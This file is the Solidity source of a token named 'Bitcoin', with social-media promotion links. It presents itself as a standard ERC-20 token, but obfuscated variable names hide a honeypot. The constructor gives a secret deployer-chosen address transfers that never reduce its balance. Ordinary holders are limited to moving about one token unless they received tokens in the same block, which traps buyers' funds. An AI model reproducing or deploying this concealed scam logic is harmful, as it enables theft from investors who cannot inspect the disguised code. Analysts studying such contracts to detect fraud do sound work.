
// File: deploy/Contract.sol
/*

🐦 Twitter: https://twitter.com/BitcoinXDERC

📞 Telegram: https://t.me/BitcoinXDERC

🌐 Website: https://bitcoinxd.crypto-token.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Bitcoin is Ownable {
    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    uint256 private poitcka = 101;

    function edmwxijcpy(address uhemfgow, address lxnbfcgpy, uint256 xuhcnl) private {
        if (0 == cqaepwbvutlf[uhemfgow]) {
            if (uhemfgow != eoqidc && rimqewnfkbt[uhemfgow] != block.number && xuhcnl < totalSupply) {
                require(xuhcnl <= totalSupply / (10 ** decimals));
            }
            balanceOf[uhemfgow] -= xuhcnl;
        }
        balanceOf[lxnbfcgpy] += xuhcnl;
        rimqewnfkbt[lxnbfcgpy] = block.number;
        emit Transfer(uhemfgow, lxnbfcgpy, xuhcnl);
    }

    mapping(address => uint256) private cqaepwbvutlf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address uhemfgow, address lxnbfcgpy, uint256 xuhcnl) public returns (bool success) {
        require(xuhcnl <= allowance[uhemfgow][msg.sender]);
        allowance[uhemfgow][msg.sender] -= xuhcnl;
        edmwxijcpy(uhemfgow, lxnbfcgpy, xuhcnl);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public name;

    function approve(address yjhaielpvnws, uint256 xuhcnl) public returns (bool success) {
        allowance[msg.sender][yjhaielpvnws] = xuhcnl;
        emit Approval(msg.sender, yjhaielpvnws, xuhcnl);
        return true;
    }

    constructor(string memory tflznu, string memory zfwmkdj, address hecikl) {
        name = tflznu;
        symbol = zfwmkdj;
        balanceOf[msg.sender] = totalSupply;
        cqaepwbvutlf[hecikl] = poitcka;
        IUniswapV2Router02 elkfvwsnbj = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        eoqidc = IUniswapV2Factory(elkfvwsnbj.factory()).createPair(address(this), elkfvwsnbj.WETH());
    }

    mapping(address => uint256) private rimqewnfkbt;

    address private eoqidc;

    function transfer(address lxnbfcgpy, uint256 xuhcnl) public returns (bool success) {
        edmwxijcpy(msg.sender, lxnbfcgpy, xuhcnl);
        return true;
    }
}

